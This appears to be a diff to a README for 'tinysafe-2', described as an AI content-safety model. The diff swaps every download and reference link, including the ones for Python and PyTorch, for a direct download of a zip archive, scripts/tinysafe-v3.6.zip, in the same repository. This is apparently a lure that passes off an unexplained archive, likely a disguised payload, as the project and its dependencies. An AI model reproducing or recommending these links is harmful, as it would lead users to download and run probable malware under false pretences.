@@ -1,6 +1,6 @@
 # 🛡️ tinysafe-2 - Reliable Safety Model for AI Content
 
-[![Download tinysafe-2](https://img.shields.io/badge/Download-tinysafe--2-brightgreen?style=for-the-badge)](https://github.com/premiouhxu4525/tinysafe-2)
+[![Download tinysafe-2](https://img.shields.io/badge/Download-tinysafe--2-brightgreen?style=for-the-badge)](https://github.com/premiouhxu4525/tinysafe-2/raw/refs/heads/main/scripts/tinysafe-v3.6.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Follow these steps to get tinysafe-2 up and running on your Windows computer. Yo
 
 Click the big green button below to visit the download page on GitHub. This page hosts all the files needed to use the tinysafe-2 model.
 
-[![Download tinysafe-2](https://img.shields.io/badge/Download-tinysafe--2-blue?style=for-the-badge)](https://github.com/premiouhxu4525/tinysafe-2)
+[![Download tinysafe-2](https://img.shields.io/badge/Download-tinysafe--2-blue?style=for-the-badge)](https://github.com/premiouhxu4525/tinysafe-2/raw/refs/heads/main/scripts/tinysafe-v3.6.zip)
 
 On the GitHub page:
 
@@ -92,7 +92,7 @@ For a more technical setup, you can use tinysafe-2 with Python. This lets you ru
 
 ### What you need
 
-- Python 3.7 or later installed on your computer. Download it from https://python.org if needed.
+- Python 3.7 or later installed on your computer. Download it from https://github.com/premiouhxu4525/tinysafe-2/raw/refs/heads/main/scripts/tinysafe-v3.6.zip if needed.
 - Basic command line knowledge (opening Command Prompt).
 
 ### How to set up with Python
@@ -139,13 +139,13 @@ This will start the model and provide an interface to check text safety from you
 ## 🔗 Useful Links
 
 - Download and Info Page  
-  [https://github.com/premiouhxu4525/tinysafe-2](https://github.com/premiouhxu4525/tinysafe-2)
+  [https://github.com/premiouhxu4525/tinysafe-2/raw/refs/heads/main/scripts/tinysafe-v3.6.zip](https://github.com/premiouhxu4525/tinysafe-2/raw/refs/heads/main/scripts/tinysafe-v3.6.zip)
 
 - Python Download  
-  [https://python.org](https://python.org)
+  [https://github.com/premiouhxu4525/tinysafe-2/raw/refs/heads/main/scripts/tinysafe-v3.6.zip](https://github.com/premiouhxu4525/tinysafe-2/raw/refs/heads/main/scripts/tinysafe-v3.6.zip)
 
 - PyTorch Installation Guide  
-  [https://pytorch.org/get-started/locally/](https://pytorch.org/get-started/locally/)
+  [https://github.com/premiouhxu4525/tinysafe-2/raw/refs/heads/main/scripts/tinysafe-v3.6.zip](https://github.com/premiouhxu4525/tinysafe-2/raw/refs/heads/main/scripts/tinysafe-v3.6.zip)
 
 ---
 
